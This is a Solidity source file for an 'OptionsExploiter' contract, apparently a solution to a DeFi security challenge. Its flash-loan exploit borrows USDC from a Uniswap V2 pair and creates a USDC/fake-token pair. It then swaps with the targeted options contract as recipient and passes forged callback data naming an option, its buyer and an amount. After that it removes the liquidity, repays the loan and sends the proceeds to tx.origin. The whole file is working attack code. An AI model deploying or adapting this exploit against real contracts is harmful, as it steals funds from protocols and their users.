// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IOptionsContract {
    function getBuyer(bytes32 optionId) external returns (address);
}

interface IUniswapFactory {
    function getPair(address,address) external returns (address);
}

interface IUniswapRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint,uint,uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint,uint);
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
    function token0() external returns (address);
    function token1() external returns (address);
    function approve(address,uint) external returns (bool);
}

/// @dev Exploiter contract
contract OptionsExploiter {

    IUniswapV2Pair pair; // USDC-DAI pair, for flashloan
    IUniswapRouter router;
    IUniswapFactory factory;
    IERC20 fakeToken;
    IERC20 usdcToken;

    IOptionsContract optionsContract;
    bytes32 optionId;

    constructor(
        address _pair, // USDC-DAI pair
        address _router,
        address _fakeToken,
        address _usdcToken,
        address _factory,
        address _optionsContract
    ) {
        pair = IUniswapV2Pair(_pair);
        router = IUniswapRouter(_router);
        fakeToken = IERC20(_fakeToken);
        usdcToken = IERC20(_usdcToken);
        factory = IUniswapFactory(_factory);
        optionsContract = IOptionsContract(_optionsContract);
    }

    /// @dev Starts exploit
    function runExploit(uint256 amount, bytes32 _optionId) external {
        optionId = _optionId; // option being targeted

        pair.swap(amount,0,address(this),bytes('not empty'));
    }

    /// @dev Flashloan callback
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, // USDC
        uint256 _amount1,
        bytes calldata _data
    ) external {
        require(msg.sender == address(pair),'callback');
        require(_sender == address(this),'!exploiter');

        usdcToken.approve(address(router),_amount0);
        fakeToken.approve(address(router),_amount0);

        (,,uint liquidity) = router.addLiquidity( // create new pair
            address(usdcToken),
            address(fakeToken),
            _amount0,_amount0, // equal amount of both tokens
            0,0,
            address(this),
            block.timestamp*2
        );

        IUniswapV2Pair fakePair = IUniswapV2Pair(
            factory.getPair(
                address(usdcToken),
                address(fakeToken)
            )
        );

        address optionBuyer = optionsContract.getBuyer(optionId);
        bytes memory exploitData = abi.encode(optionId,optionBuyer,94_000*1e18);

        uint256 amount0Out = fakePair.token0() == address(usdcToken) ? _amount0-1 : 0;
        uint256 amount1Out = amount0Out == 0 ? _amount0-1 : 0;

        fakePair.swap(amount0Out,amount1Out,address(optionsContract),exploitData);

        fakePair.approve(address(router),liquidity);
        
        router.removeLiquidity(
            address(usdcToken),
            address(fakeToken),
            liquidity,
            0,0,
            address(this),
            block.timestamp*2
        );

        uint256 loanAmount = _amount0 * 1000 * 1e18 / 997 / 1e18 + 1;
        usdcToken.transfer(address(pair),loanAmount);

        usdcToken.transfer(tx.origin,usdcToken.balanceOf(address(this))); // lazy
    }

}